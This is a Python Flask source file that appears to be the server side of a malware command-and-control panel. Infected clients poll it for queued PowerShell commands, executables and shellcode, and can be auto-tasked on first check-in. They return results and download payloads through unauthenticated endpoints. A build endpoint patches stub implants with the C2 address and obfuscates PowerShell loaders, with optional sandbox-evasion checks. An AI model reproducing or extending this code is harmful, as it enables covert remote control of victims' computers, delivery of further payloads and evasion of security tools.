import base64
import json
import logging
import os
import re
import shutil
import tempfile
import threading
import time
import unicodedata
import uuid
from datetime import datetime, timedelta
from contextlib import contextmanager

import subprocess
import requests
import flask_cors

from flask import (
    Flask, request, jsonify, render_template,
    redirect, url_for, send_file, send_from_directory, after_this_request, current_app, request
)
from flask_login import login_required, current_user
from jinja2 import TemplateNotFound
from werkzeug.serving import WSGIRequestHandler
from werkzeug.utils import secure_filename
from sqlalchemy.exc import SQLAlchemyError, OperationalError
from sqlalchemy import or_

from apps.authentication.models import Clients
from apps.home import blueprint
from apps.home.master.Builder import patch_exe, zip_and_clean
from apps import db

flask_cors.CORS(blueprint)
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)
logger.addHandler(ch)


class Task(db.Model):
    __tablename__ = 'tasks'

    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(100), nullable=False)
    issue_date = db.Column(db.DateTime, default=datetime.utcnow)
    command = db.Column(db.Text, nullable=True)
    status = db.Column(db.String(20), default='Pending')
    response = db.Column(db.Text, default='')
    task_type = db.Column(db.String(20))
    file_path = db.Column(db.String(255))
    entry_point = db.Column(db.String(100))

    def __repr__(self):
        return f'<Task {self.id} for {self.client_id}>'


class AutoTask(db.Model):
    __tablename__ = 'auto_tasks'

    id = db.Column(db.String(50), primary_key=True)
    user_id = db.Column(db.Integer, nullable=False)
    task_type = db.Column(db.String(20))
    command = db.Column(db.Text, nullable=True)
    is_active = db.Column(db.Boolean, default=True)
    file_path = db.Column(db.String(255))
    entry_point = db.Column(db.String(100))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f'<AutoTask {self.id}>'


class ClientAutoTask(db.Model):
    __tablename__ = 'client_auto_tasks'

    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(100), nullable=False)
    task_id = db.Column(db.String(50), nullable=False)
    executed_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    __table_args__ = (db.UniqueConstraint('client_id', 'task_id', name='_client_task_uc'),)


messages_lock = threading.Lock()
results_lock = threading.Lock()
activity_lock = threading.Lock()
db_lock = threading.Lock()  # Add database lock for concurrent access

MESSAGE_FILE = "message.json"
POST_LOG_FILE = "post.log"
GET_LOG_FILE = "get.log"

client_activity = {}
ACTIVITY_INTERVAL = 43200


def safe_load_json(filename):
    if os.path.getsize(filename) == 0:
        with open(filename, 'w') as f:
            json.dump({}, f)
        return {}
    with open(filename, 'r') as f:
        return json.load(f)


messages = safe_load_json(MESSAGE_FILE)


def save_messages():
    with open(MESSAGE_FILE, 'w') as f:
        json.dump(messages, f)


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('werkzeug')
logger.handlers.clear()

post_handler = logging.FileHandler(POST_LOG_FILE)
post_handler.setFormatter(logging.Formatter('%(message)s'))
logger.addHandler(post_handler)

get_handler = logging.FileHandler(GET_LOG_FILE)
get_handler.setFormatter(logging.Formatter('%(message)s'))
logger.addHandler(get_handler)

WSGIRequestHandler.address_string = lambda x: ''


def log_request(response):
    """Log requests to appropriate files"""
    timestamp = datetime.now().strftime('[%d/%b/%Y %H:%M:%S]')
    log_line = f'127.0.0.1 - - {timestamp} "{request.method} {request.path} HTTP/1.1" {response.status_code} -\n'

    if request.method == 'POST':
        with open(POST_LOG_FILE, 'a') as f:
            f.write(log_line)
    elif request.method == 'GET':
        with open(GET_LOG_FILE, 'a') as f:
            f.write(log_line)

    return response


@contextmanager
def db_session_scope():
    """Provide a transactional scope around a series of operations."""
    session = db.session
    try:
        yield session
        session.commit()
    except Exception as e:
        session.rollback()
        raise e
    finally:
        session.close()


@blueprint.route('/dashboard')
@login_required
def dashboard():
    return render_template('home/dashboard.html',
                           segment='dashboard',
                           user_id=current_user.id)


@blueprint.route('/<template>')
@login_required
def route_template(template):
    try:
        if not template.endswith('.html'):
            template += '.html'

        segment = get_segment(request)
        return render_template("home/" + template, segment=segment)

    except TemplateNotFound:
        return render_template('home/page-404.html'), 404

    except:
        return render_template('home/page-500.html'), 500


def get_segment(request):
    try:
        segment = request.path.split('/')[-1]
        if segment == '':
            segment = 'index'
        return segment
    except:
        return None


########################### START CLIENT SECTION ############################################


def update_client_activity(client_id, ip=None):
    if not ip:
        ip = request.remote_addr or "unknown"
    with activity_lock:
        client_activity[client_id] = {
            "last_seen": datetime.utcnow(),
            "ip": ip,
        }


@blueprint.route('/check', methods=['GET'])
def check_messages():
    raw_client_id = request.args.get('client_id')
    if not raw_client_id:
        return jsonify({"error": "Missing client_id"}), 400

    client_id = clean_client_id(raw_client_id)

    ip = request.remote_addr or "unknown"
    update_client_activity(client_id, ip)

    # --- Auto Task Assignment Logic ---
    with db_session_scope() as session:
        # Find user_id associated with this client
        client_record = session.query(Clients).filter_by(client_id=client_id).first()
        user_id = client_record.user_id if client_record else 1
        
        # Get all active auto tasks for this user
        active_auto_tasks = session.query(AutoTask).filter_by(user_id=user_id, is_active=True).all()
        
        if active_auto_tasks:
            # Get IDs of tasks this client has already executed
            executed_records = session.query(ClientAutoTask.task_id).filter_by(client_id=client_id).all()
            executed_task_ids = {record.task_id for record in executed_records}
            
            for at in active_auto_tasks:
                if at.id not in executed_task_ids:
                    # Client hasn't executed this task cleanly yet.
                    # Mark it as executed for this client to prevent re-running
                    new_client_autotask = ClientAutoTask(client_id=client_id, task_id=at.id)
                    session.add(new_client_autotask)
                    
                    # Create the actual physical Task object for the client
                    new_task = Task(
                        client_id=client_id,
                        task_type=at.task_type,
                        command=at.command,
                        file_path=at.file_path,
                        entry_point=at.entry_point
                    )
                    session.add(new_task)
                    session.flush() # get new_task id without committing whole txn yet
                    
                    # Queue message
                    msg_dict = {
                        "type": at.task_type,
                        "task_id": new_task.id
                    }
                    if at.task_type == 'powershell':
                        msg_dict["command"] = at.command
                    elif at.task_type in ('executable', 'ShellCode'):
                        if at.file_path:
                            encoded_path = base64.b64encode(at.file_path.encode('utf-8')).decode('utf-8')
                            msg_dict["file_path"] = encoded_path
                        msg_dict["entry_point"] = at.entry_point
                    
                    with messages_lock:
                        if client_id not in messages:
                            messages[client_id] = []
                        messages[client_id].append(json.dumps(msg_dict))
            
            # Commit all database saves together       
            session.commit()
            
            with messages_lock:
                save_messages()
    # -----------------------------------

    with messages_lock:
        client_messages = messages.get(client_id, [])
        if client_messages:
            del messages[client_id]
            save_messages()

        parsed_commands = []
        for msg in client_messages:
            try:
                if isinstance(msg, dict):
                    parsed_commands.append(msg)
                else:
                    parsed = json.loads(msg)
                    parsed_commands.append(parsed)
            except:
                parsed_commands.append({
                    "type": "powershell",
                    "command": msg
                })

    response = jsonify(parsed_commands)
    return log_request(response)


def clean_client_id(raw_id):
    normalized = unicodedata.normalize("NFKC", raw_id)
    cleaned = ''.join(c for c in normalized if not c.isspace())
    return cleaned


@blueprint.route('/saveresult', methods=['POST'])
def save_result():
    try:
        data = request.json
        if not data or 'task_id' not in data or 'result' not in data:
            logger.error("Missing task_id or result in request")
            return jsonify({"error": "Missing task_id or result"}), 400

        client_id = clean_client_id(data.get('client_id', 'unknown'))
        update_client_activity(client_id)

        task_id = data.get('task_id')
        result_data = data.get('result')

        logger.info(f"=== Processing /saveresult ===")
        logger.info(f"Client ID: {client_id}")
        logger.info(f"Task ID: {task_id}")
        logger.info(f"Result length: {len(str(result_data))}")

        # Use database lock to prevent race conditions
        with db_lock:
            try:
                # Use a separate session for each request
                with db_session_scope() as session:
                    # First try to find the task with proper locking
                    task = session.query(Task).filter(
                        Task.id == task_id,
                        Task.client_id == client_id
                    ).with_for_update().first()  # Lock the row for update

                    if task:
                        logger.info(f"Found task {task_id} for client {client_id}. Current status: {task.status}")

                        # Check if task is already completed
                        if task.status == 'Completed':
                            logger.warning(f"Task {task_id} is already completed")
                            return jsonify({"message": "Task already completed", "task_id": task_id}), 200

                        # Update task with result
                        task.response = str(result_data)[:1000000]  # Limit response size
                        task.status = 'Completed'
                        session.commit()

                        logger.info(f"Successfully updated task {task_id} to 'Completed'")
                        return jsonify({
                            "message": "Result saved successfully",
                            "task_id": task_id,
                            "status": "completed"
                        }), 200
                    else:
                        logger.error(f"Task not found: ID={task_id}, Client={client_id}")
                        # Try to find if task exists with different client_id (for debugging)
                        other_tasks = session.query(Task.id, Task.client_id, Task.status).filter(
                            Task.id == task_id
                        ).all()
                        if other_tasks:
                            logger.error(f"Task exists but with different client: {other_tasks}")
                        return jsonify({
                            "error": f"Task not found for client {client_id} with task_id {task_id}"
                        }), 404

            except OperationalError as e:
                logger.error(f"Database operational error: {str(e)}")
                # Retry logic for deadlock or lock timeout
                time.sleep(0.1)
                try:
                    with db_session_scope() as session:
                        task = session.query(Task).filter(
                            Task.id == task_id,
                            Task.client_id == client_id
                        ).first()
                        if task:
                            task.response = str(result_data)[:1000000]
                            task.status = 'Completed'
                            session.commit()
                            return jsonify({"message": "Result saved after retry"}), 200
                except Exception as retry_error:
                    logger.error(f"Retry failed: {str(retry_error)}")
                    return jsonify({"error": "Database error, please retry"}), 503

            except SQLAlchemyError as e:
                logger.error(f"Database error: {str(e)}")
                return jsonify({"error": "Database error occurred"}), 500
            except Exception as e:
                logger.error(f"Unexpected error: {str(e)}", exc_info=True)
                return jsonify({"error": "Internal server error"}), 500

    except Exception as e:
        logger.error(f"Error in save_result: {str(e)}", exc_info=True)
        return jsonify({"error": "Internal server error"}), 500


def get_country_code_from_ip(ip_address):
    if not ip_address or ip_address == "unknown":
        return "Unknown"
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json", timeout=5)
        response.raise_for_status()
        return response.json().get("country", "Unknown")
    except requests.exceptions.RequestException as e:
        logger.error(f"Could not get country for IP {ip_address}: {e}")
        return "Error"

@blueprint.route('/download_file', methods=['GET'])
def downloadfile():
    encoded_file_path = request.args.get('file_path')
    if not encoded_file_path:
        return jsonify({"error": "File not found"}), 404
        
    try:
        file_path = base64.b64decode(encoded_file_path).decode('utf-8')
    except Exception:
        return jsonify({"error": "Invalid file path format"}), 400
        
    full_path = os.path.join(current_app.root_path, file_path)
    if not os.path.exists(full_path):
        return jsonify({"error": "File not found"}), 404

    return send_file(full_path)


@blueprint.route('/Get', methods=['GET'])
def download_file():
    encoded_file_path = request.args.get('path')
    if not encoded_file_path:
        return jsonify({"error": "File not found"}), 404
        
    try:
        file_path = base64.b64decode(encoded_file_path).decode('utf-8')
    except Exception:
        return jsonify({"error": "Invalid file path format"}), 400
        
    full_path = os.path.join(current_app.root_path, file_path)
    if not os.path.exists(full_path):
        return jsonify({"error": "File not found"}), 404

    return send_file(full_path)


########################### END CLIENT SECTION ############################################

########################### START API SECTION ############################################


@blueprint.route('/api/clients', methods=['GET'])
@login_required
def api_list_clients():
    logger.info("--- /api/clients START ---")
    logger.info(f"User: {current_user.username}, is_admin: {current_user.is_admin}")

    try:
        interval = int(request.args.get('interval', ACTIVITY_INTERVAL))
    except ValueError:
        interval = ACTIVITY_INTERVAL

    now = datetime.utcnow()
    cutoff = now - timedelta(seconds=interval)
    five_min_cutoff = now - timedelta(minutes=5)

    active_clients = []

    with activity_lock:
        if current_user.is_admin:
            logger.info("Admin user, including all clients from activity log.")
            client_ids = set(client_activity.keys())
        else:
            logger.info("Non-admin user, fetching only user's clients.")
            clients = list(current_user.clients)
            client_ids = {client.client_id for client in clients}

        logger.info(f"Allowed client IDs: {client_ids}")
        logger.debug(f"Client activity dictionary: {client_activity}")

        for client_id, info in client_activity.items():
            if client_id not in client_ids:
                logger.debug(f"Skipping client '{client_id}' (not in allowed IDs).")
                continue

            last_seen = info.get("last_seen")
            if not isinstance(last_seen, datetime):
                logger.warning(f"Client '{client_id}' has invalid last_seen value: {last_seen}")
                continue

            logger.debug(f"Checking client {client_id}, last_seen: {last_seen}, cutoff: {cutoff}")
            if last_seen >= cutoff:
                logger.info(f"Client {client_id} is active.")
                active_clients.append({
                    "client_id": client_id,
                    "ip": info.get("ip", "unknown"),
                    "country": get_country_code_from_ip(info.get("ip", "unknown")),
                    "last_active": last_seen.strftime('%Y-%m-%d %H:%M:%S'),
                    "active_recently": last_seen >= five_min_cutoff
                })
            else:
                logger.debug(f"Client {client_id} is inactive (last_seen: {last_seen})")

    logger.info(f"Returning {len(active_clients)} active clients.")
    logger.info("--- /api/clients END ---")

    return jsonify({
        "status": "success",
        "active_clients": active_clients,
        "interval": interval
    })


@blueprint.route('/api/auto_tasks', methods=['GET'])
@login_required
def api_get_auto_tasks():
    page = request.args.get('page', default=1, type=int)
    per_page = request.args.get('per_page', default=10, type=int)
    
    try:
        with db_session_scope() as session:
            query = session.query(AutoTask).filter_by(user_id=current_user.id)
            total = query.count()
            tasks = query.order_by(AutoTask.created_at.desc()) \
                .offset((page - 1) * per_page) \
                .limit(per_page) \
                .all()
                
            tasks_data = []
            for task in tasks:
                tasks_data.append({
                    "id": task.id,
                    "created_at": task.created_at.strftime('%Y-%m-%d %H:%M:%S') if task.created_at else None,
                    "command": task.command,
                    "task_type": task.task_type,
                    "file_path": task.file_path,
                    "entry_point": task.entry_point,
                    "is_active": task.is_active
                })
                
            total_pages = (total + per_page - 1) // per_page
            
            return jsonify({
                "status": "success",
                "tasks": tasks_data,
                "pagination": {
                    "page": page,
                    "per_page": per_page,
                    "total_pages": total_pages,
                    "total_items": total,
                    "has_next": page < total_pages,
                    "has_prev": page > 1
                }
            })
    except Exception as e:
        logger.error(f"Error in api_get_auto_tasks: {str(e)}", exc_info=True)
        return jsonify({"error": "Failed to fetch auto tasks"}), 500

@blueprint.route('/api/add_auto_task', methods=['POST'])
@login_required
def api_add_auto_task():
    try:
        if 'file' in request.files:
            file = request.files['file']
            task_type = request.form.get('task_type')
            process_target = request.form.get('process_target', 'dwa')
            
            if not task_type:
                return jsonify({"error": "Missing task_type"}), 400
                
            if not file or file.filename == '':
                return jsonify({"error": "No selected file"}), 400
                
            task_uuid = str(uuid.uuid4())
            task_folder = os.path.join(current_app.root_path, 'files', task_uuid)
            os.makedirs(task_folder, exist_ok=True)
            
            filename = secure_filename(file.filename)
            file_path = os.path.join(task_folder, filename)
            file.save(file_path)
            
            output_path = os.path.join(task_folder, filename.rsplit('.', 1)[0] + '.bin')
            filename_lower = filename.lower()
            if filename_lower.endswith('.exe'):
                output_path = file_path
            
            # Use relative path for storage
            relative_output_path = os.path.relpath(output_path, current_app.root_path)
                
            with db_session_scope() as session:
                task_id = f"{int(time.time())}-{str(uuid.uuid4())[:8]}"
                new_task = AutoTask(
                    id=task_id,
                    user_id=current_user.id,
                    task_type=task_type,
                    file_path=relative_output_path,
                    entry_point=process_target
                )
                session.add(new_task)
                session.commit()
                
            return jsonify({
                "status": "success",
                "message": "File auto task created",
                "task_id": task_id
            })
            
        elif request.json:
            data = request.json
            task_type = data.get('task_type')
            command = data.get('command')
            
            if not task_type:
                return jsonify({"error": "Missing task_type"}), 400
                
            if task_type == 'powershell' and not command:
                return jsonify({"error": "Missing command for PowerShell task"}), 400
                
            with db_session_scope() as session:
                task_id = f"{int(time.time())}-{str(uuid.uuid4())[:8]}"
                new_task = AutoTask(
                    id=task_id,
                    user_id=current_user.id,
                    task_type=task_type,
                    command=command
                )
                session.add(new_task)
                session.commit()
                
            return jsonify({
                "status": "success",
                "message": "Command auto task created",
                "task_id": task_id
            })
        else:
            return jsonify({"error": "Invalid request format"}), 400
    except Exception as e:
        logger.error(f"Error in add_auto_task: {str(e)}", exc_info=True)
        return jsonify({"error": f"Unexpected error: {str(e)}"}), 500

@blueprint.route('/api/delete_auto_tasks', methods=['POST'])
@login_required
def api_delete_auto_tasks():
    data = request.json
    if not data or 'task_ids' not in data:
        return jsonify({"error": "Missing task_ids"}), 400

    task_ids = data['task_ids']
    if not isinstance(task_ids, list):
        return jsonify({"error": "task_ids must be a list"}), 400

    try:
        with db_session_scope() as session:
            tasks_to_delete = session.query(AutoTask).filter(
                AutoTask.id.in_(task_ids),
                AutoTask.user_id == current_user.id
            ).all()
            
            for task in tasks_to_delete:
                if task.file_path:
                    full_path = os.path.join(current_app.root_path, task.file_path)
                    folder_path = os.path.dirname(full_path)
                    # Verify we are only deleting from the 'files' directory
                    if os.path.exists(folder_path) and 'files' in folder_path:
                        shutil.rmtree(folder_path, ignore_errors=True)
            
            session.query(AutoTask).filter(
                AutoTask.id.in_(task_ids),
                AutoTask.user_id == current_user.id
            ).delete(synchronize_session=False)
            session.commit()
            
        return jsonify({"status": "success", "message": "Auto tasks deleted"})
    except Exception as e:
        logger.error(f"Error deleting auto tasks: {str(e)}", exc_info=True)
        return jsonify({"error": "Failed to delete auto tasks"}), 500


@blueprint.route('/api/toggle_auto_task', methods=['POST'])
@login_required
def api_toggle_auto_task():
    try:
        data = request.json
        if not data or 'task_id' not in data:
            return jsonify({"error": "Missing task_id"}), 400

        task_id = data['task_id']
        
        with db_session_scope() as session:
            task = session.query(AutoTask).filter_by(id=task_id, user_id=current_user.id).first()
            if not task:
                return jsonify({"error": "Task not found"}), 404
                
            task.is_active = not task.is_active
            new_status = task.is_active
            session.commit()
            
        return jsonify({
            "status": "success", 
            "message": f"Task {'resumed' if new_status else 'paused'} successfully",
            "is_active": new_status
        })
    except Exception as e:
        logger.error(f"Error toggling auto task: {str(e)}", exc_info=True)
        return jsonify({"error": "Failed to toggle auto task"}), 500


@blueprint.route('/api/send_command', methods=['POST'])
def api_send_command():
    if 'file' in request.files:
        return handle_file_upload(request)
    elif request.json:
        return handle_json_command(request)
    else:
        return log_request(jsonify({"error": "Invalid request format"}), 400)


def handle_file_upload(request):
    file = request.files['file']

    client_id = request.form.get('client_id')
    task_type = request.form.get('task_type')
    ProcessTarget = request.form.get('process_target', 'dwa')

    if not client_id or not task_type:
        return log_request(jsonify({"error": "Missing client_id or task_type"}), 400)

    client_id = clean_client_id(client_id)

    if not file or file.filename == '':
        return log_request(jsonify({"error": "No selected file"}), 400)

    task_uuid = str(uuid.uuid4())
    task_folder = os.path.join(current_app.root_path, 'files', task_uuid)
    os.makedirs(task_folder, exist_ok=True)

    filename = secure_filename(file.filename)
    file_path = os.path.join(task_folder, filename)
    file.save(file_path)

    output_path = os.path.join(task_folder, filename.rsplit('.', 1)[0] + '.bin')

    filename_lower = filename.lower()
    try:
        if filename_lower.endswith('.exe'):
            output_path = file_path
            
        relative_output_path = os.path.relpath(output_path, current_app.root_path)

        with db_session_scope() as session:
            new_task = Task(
                client_id=client_id,
                task_type=task_type,
                file_path=relative_output_path,
                entry_point=ProcessTarget
            )
            session.add(new_task)
            session.commit()
            task_id = new_task.id

        encoded_path = ""
        if relative_output_path:
            encoded_path = base64.b64encode(relative_output_path.encode('utf-8')).decode('utf-8')

        message = json.dumps({
            "type": task_type,
            "task_id": task_id,
            "file_path": encoded_path,
            "entry_point": ProcessTarget
        })

        queue_message(client_id, message)

        return log_request(jsonify({
            "status": "success",
            "message": f"File task queued for {client_id}",
            "task_id": task_id
        }))

    except Exception as e:
        logger.error(f"Error in handle_file_upload: {str(e)}", exc_info=True)
        return jsonify({"error": f"Unexpected error: {str(e)}"}), 500


def handle_json_command(request):
    data = request.json
    client_id = data.get('client_id')
    task_type = data.get('task_type')
    command = data.get('command')

    if not client_id or not task_type:
        return log_request(jsonify({"error": "Missing client_id or task_type"}), 400)

    client_id = clean_client_id(client_id)

    if task_type == 'powershell' and not command:
        return log_request(jsonify({"error": "Missing command for PowerShell task"}), 400)

    try:
        with db_session_scope() as session:
            new_task = Task(
                client_id=client_id,
                task_type=task_type,
                command=command
            )
            session.add(new_task)
            session.commit()
            task_id = new_task.id

        message = json.dumps({
            "type": task_type,
            "task_id": task_id,
            "command": command
        })

        queue_message(client_id, message)

        return log_request(jsonify({
            "status": "success",
            "message": f"Command queued for {client_id}",
            "task_id": task_id
        }))
    except Exception as e:
        logger.error(f"Error in handle_json_command: {str(e)}", exc_info=True)
        return jsonify({"error": f"Unexpected error: {str(e)}"}), 500


def queue_message(client_id, message):
    with messages_lock:
        if client_id not in messages:
            messages[client_id] = []
        messages[client_id].append(message)
        save_messages()


@blueprint.route('/api/tasks', methods=['GET'])
@login_required
def api_get_tasks():
    client_id = request.args.get('client_id')
    status = request.args.get('status')
    search = request.args.get('search')
    page = request.args.get('page', default=1, type=int)
    per_page = request.args.get('per_page', default=10, type=int)

    try:
        with db_session_scope() as session:
            query = session.query(Task)

            if client_id:
                clean_cid = clean_client_id(client_id)
                query = query.filter(Task.client_id == clean_cid)
            if status:
                query = query.filter(Task.status == status)
            if search:
                query = query.filter(
                    or_(
                        Task.command.ilike(f'%{search}%'),
                        Task.response.ilike(f'%{search}%'),
                        Task.client_id.ilike(f'%{search}%'),
                        Task.file_path.ilike(f'%{search}%'),
                        Task.entry_point.ilike(f'%{search}%')
                    )
                )

            total = query.count()
            tasks = query.order_by(Task.issue_date.desc()) \
                .offset((page - 1) * per_page) \
                .limit(per_page) \
                .all()

            tasks_data = []
            for task in tasks:
                response = task.response
                if response and len(response) > 5000:
                    response = response[:5000] + \
                               f"\n\n[TRUNCATED - {len(task.response) - 5000} characters omitted]"

                tasks_data.append({
                    "id": task.id,
                    "client_id": task.client_id,
                    "issue_date": task.issue_date.strftime('%Y-%m-%d %H:%M:%S') if task.issue_date else None,
                    "command": task.command,
                    "status": task.status,
                    "response": response,
                    "task_type": task.task_type,
                    "file_path": task.file_path,
                    "entry_point": task.entry_point
                })

            total_pages = (total + per_page - 1) // per_page

            return jsonify({
                "status": "success",
                "tasks": tasks_data,
                "pagination": {
                    "page": page,
                    "per_page": per_page,
                    "total_pages": total_pages,
                    "total_items": total,
                    "has_next": page < total_pages,
                    "has_prev": page > 1
                }
            })
    except Exception as e:
        logger.error(f"Error in api_get_tasks: {str(e)}", exc_info=True)
        return jsonify({"error": "Failed to fetch tasks"}), 500


@blueprint.route('/api/delete_tasks', methods=['POST'])
@login_required
def api_delete_tasks():
    data = request.json
    if not data or 'task_ids' not in data:
        return jsonify({"error": "Missing task_ids"}), 400

    task_ids = data['task_ids']
    if not isinstance(task_ids, list):
        return jsonify({"error": "task_ids must be a list"}), 400

    try:
        with db_session_scope() as session:
            # Delete tasks
            session.query(Task).filter(Task.id.in_(task_ids)).delete(synchronize_session=False)
            session.commit()

        # Clean up messages
        with messages_lock:
            for client_id in list(messages.keys()):
                new_msgs = []
                for msg in messages[client_id]:
                    try:
                        parsed = json.loads(msg)
                        if parsed.get("task_id") not in task_ids:
                            new_msgs.append(msg)
                    except Exception:
                        new_msgs.append(msg)

                if new_msgs:
                    messages[client_id] = new_msgs
                else:
                    del messages[client_id]
            save_messages()

        return jsonify({"status": "success", "message": "Tasks deleted successfully"})
    except Exception as e:
        logger.error(f"Error deleting tasks: {str(e)}", exc_info=True)
        return jsonify({"error": "Failed to delete tasks"}), 500


def build_cmd(xcrypt_path, temp_input, temp_output, iterations=3, include_sandbox_checks=False):
    """
    Build the PowerShell command to run Pcrypt.ps1 with the new argument format.
    
    Args:
        xcrypt_path: Path to Pcrypt.ps1
        temp_input: Input PowerShell script path
        temp_output: Output obfuscated script path
        iterations: Number of obfuscation iterations (default: 3)
        include_sandbox_checks: Whether to include sandbox detection checks (default: True)
    """
    xcrypt_path = str(xcrypt_path)
    temp_input = str(temp_input)
    temp_output = str(temp_output)

    powershell = "powershell.exe"

    # Build the command with new argument format
    pcrypt_cmd = f"& '{xcrypt_path}' -InFile '{temp_input}' -OutFile '{temp_output}' -Iterations {iterations}"
    
    # Add sandbox checks flag if enabled
    if include_sandbox_checks:
        pcrypt_cmd += " -IncludeSandboxChecks"

    cmd = [
        powershell,
        "-ExecutionPolicy", "Bypass",
        "-Command",
        pcrypt_cmd
    ]
    return cmd


def obfuscate_powershell(modified_script, xcrypt_path, iterations=3, include_sandbox_checks=False):
    """
    Takes a PowerShell script string, runs Pcrypt.ps1 to obfuscate it,
    and returns the obfuscated code as a string.
    
    Args:
        modified_script: The PowerShell script content to obfuscate
        xcrypt_path: Path to Pcrypt.ps1
        iterations: Number of obfuscation iterations (default: 3)
        include_sandbox_checks: Whether to include sandbox detection checks (default: True)
    """
    # Create temporary input and output file paths
    temp_input = os.path.join(tempfile.gettempdir(), f"{uuid.uuid4()}_input.ps1")
    temp_output = os.path.join(tempfile.gettempdir(), f"{uuid.uuid4()}_output.ps1")

    try:
        # Write modified script to temp input file
        with open(temp_input, "w", encoding="utf-8") as f:
            f.write(modified_script)

        # Build PowerShell command with new argument format
        cmd = build_cmd(xcrypt_path, temp_input, temp_output, iterations, include_sandbox_checks)

        # Run PowerShell process
        subprocess.run(cmd, check=True)

        # Read obfuscated script
        with open(temp_output, "r", encoding="utf-8") as f:
            obfuscated_script = f.read()

    finally:
        # Clean up temp files
        for path in [temp_input, temp_output]:
            if os.path.exists(path):
                os.remove(path)

    return obfuscated_script




@blueprint.route('/api/build-client', methods=['POST'])
@login_required
def api_build_client():
    data = request.json
    if not data or 'clientName' not in data:
        return jsonify({"error": "Missing clientName"}), 400

    client_name = clean_client_id(data['clientName'])
    c2_address = data.get('c2Address', 'http://localhost')
    port = data.get('port', 5000)
    checkin_interval = data.get('checkinInterval', 60)
    output_format = data.get('outputFormat', 'exe')

    system_temp = tempfile.gettempdir()
    prefix = "OrangeSolution"

    for entry in os.listdir(system_temp):
        full_path = os.path.join(system_temp, entry)
        if entry.startswith(prefix) and os.path.isdir(full_path):
            try:
                shutil.rmtree(full_path)
                logger.info(f"Deleted: {full_path}")
            except Exception as e:
                logger.error(f"Failed to delete {full_path}: {e}")

    temp_dir = tempfile.mkdtemp(prefix="OrangeSolution")

    for filename in os.listdir(temp_dir):
        file_path = os.path.join(temp_dir, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            logger.error(f"Failed to delete {file_path}. Reason: {e}")

    try:
        app_root = current_app.root_path

        if output_format == 'exe':
            output_exe = os.path.join(temp_dir, f"{client_name}.exe")

            original_exe = os.path.join(app_root, 'home', 'master', 'stub', "FinalStub.exe")

            encoded = base64.b64encode(f"{c2_address}:{port}".encode('utf-8'))
            encoded_str = encoded.decode('ascii')

            patches = [
                {'type': 'string',
                 'old_value': "test1cppsssssssssssssssssss",
                 'new_value': client_name,
                 "max_length": 256
                 },

                {'type': 'string',
                 'old_value': "http://localhostsssssssssssssssssssssssss:5000",
                 'new_value': encoded_str,
                 "max_length": 256

                 },

                {
                    'type': 'string',
                    'old_value': "50000",
                    'new_value': f"{checkin_interval}",
                    "max_length": 256},
            ]
            patch_exe(original_exe, patches, output_exe)

        elif output_format == 'ps1':
            original_ps1 = os.path.join(app_root, 'home', 'master', 'stub', "new1.ps1")
            crypter = os.path.join(app_root, 'home', 'master', 'stub', "Pcrypt.ps1")

            with open(original_ps1, "r", encoding="utf-8") as f:
                content = f.read()

            # Build the full C2 address with port
            full_c2_address = f"{c2_address}:{port}"

            # Replace placeholders with actual values
            new_content = content.replace("%clientId%", client_name)
            new_content = new_content.replace("%C2_ADDRESS%", full_c2_address)
            new_content = new_content.replace("%INTERVAL%", str(checkin_interval))

            # Obfuscate the PowerShell script
            obfuscated_content = obfuscate_powershell(new_content, crypter)
            output_exe = os.path.join(temp_dir, f"{client_name}.ps1")
            with open(output_exe, "w", encoding="utf-8") as f:
                f.write(obfuscated_content)

        else:
            original_exe = os.path.join(app_root, 'home', 'master', 'stub', "ploader.py")
            with open(original_exe, "r", encoding="utf-8") as f:
                content = f.read()
            c2_address = c2_address + ':' + str(port)
            new_content = content.replace("%clientId%", client_name)
            new_content = new_content.replace("%C2_ADDRESS%", c2_address)
            new_content = new_content.replace("%INTERVAL%", str(checkin_interval))

            output_exe = os.path.join(temp_dir, f"{client_name}.py")
            with open(output_exe, "w", encoding="utf-8") as f:
                f.write(new_content)

        zip_filename = f"{client_name}.zip"
        zip_path = os.path.join(temp_dir, zip_filename)
        zip_and_clean(output_exe, client_name, client_name, zip_path)

        return send_file(zip_path, as_attachment=True, download_name=zip_filename)

    except Exception as e:
        shutil.rmtree(temp_dir, ignore_errors=True)
        current_app.logger.exception("Build failed")
        return jsonify({"error": str(e)}), 500


@blueprint.route('/api/task_stats', methods=['GET'])
@login_required
def api_task_stats():
    try:
        with db_session_scope() as session:
            total_tasks = session.query(Task).count()
            completed_tasks = session.query(Task).filter_by(status='Completed').count()
            pending_tasks = session.query(Task).filter_by(status='Pending').count()

            return jsonify({
                "status": "success",
                "total_tasks": total_tasks,
                "completed_tasks": completed_tasks,
                "pending_tasks": pending_tasks
            })
    except Exception as e:
        logger.error(f"Error getting task stats: {str(e)}")
        return jsonify({"error": "Failed to get task statistics"}), 500


########################### END API SECTION ############################################